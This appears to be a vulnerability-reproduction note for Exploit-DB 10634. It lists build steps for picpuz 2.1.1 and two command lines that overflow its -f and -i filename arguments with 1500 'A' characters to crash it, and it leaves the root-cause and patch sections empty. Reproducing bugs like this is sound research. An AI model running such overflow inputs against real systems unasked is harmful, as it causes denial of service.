# EDB-10634

## Experiment Environment

Ubuntu 11.04

## INSTALL & Configuration

```
wget https://github.com/mudongliang/source-packages/raw/master/EDB-10634/picpuz-2.1.1.tar.gz
tar -xvf picpuz-2.1.1.tar.gz
cd picpuz-2.1.1
make 
```

## Problems in Installation & Configuration


## How to trigger vulnerability

Image filename overflow:
```
./picpuz -f $(python -c 'print "A"*1500')
```
 
Directory filename overflow:
```
./picpuz -i $(python -c 'print "A"*1500')
```

## PoCs

[Picpuz 2.1.1 - Buffer Overflow (Denial of Service) (PoC)](https://www.exploit-db.com/exploits/10634/)

## Vulnerability Patch

### Root Cause

### Stack Trace

### Patch

## References
